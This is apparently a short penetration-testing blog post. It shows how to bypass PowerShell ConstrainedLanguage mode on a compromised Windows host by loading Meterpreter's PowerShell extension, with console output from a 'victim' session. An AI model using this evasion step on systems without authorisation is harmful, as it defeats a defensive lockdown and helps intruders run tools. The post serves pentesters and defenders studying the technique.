---
title: "Powershell Constrained Mode Bypass With Meterpreter"
date: 2021-05-29T20:52:32-04:00
year: "2021"
month: "2021/05"
toc: false
comments: true
images:
tags:
draft: false
---

The powershell extension for meterpreter likely isn't a well known feature of
the meterpreter shell. Most pentesters are likely to just run powershell from
the command shell that meterpreter launches with the `shell` command instead
of loading the extension. But this can be problematic for environments that
lock down Powershell.

<!--more-->

As can be seen below, we have landed a meterpreter instance and dropped into a
command shell. We'd like to run some tools in Powershell, but after checking
the LanguageMode, we can see that we're in ConstrainedLanguage mode. Since
this blocks the tools we want to run, we exit the shell.

```
meterpreter > shell
Procdess 39630 created.
Channel 2 created.
Microsoft Windows [Version 10.0.19042.985]
(c) Microsoft Corporation. All rights reserved.

C:\Users\victim> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\victim> $ExecutionContext.SessionState.LanguageMode
$ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
PS C:\Users\victim> exit
exit

c:\Users\victim>exit
exit
```

The powershell extension in meterpreter doesn't provide a shell that is as
clean as the command shell built in to meterpreter and I've had issues trying
to exit it. But it loads an unmanaged Windows PowerShell Runspace which will
not be subject to the LanguageMode from the powershell executable.

Below we load the powershell extension, then drop into a shell using the new
`powershell_shell` command available to us. As can be seen, checking the 
LanguageMode now shows that we are in FullLanguage mode and can now load tools
that require this mode for operation.

```
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > $ExecutionContext.SessionState.LanguageMode
FullLanguage
PS > 
```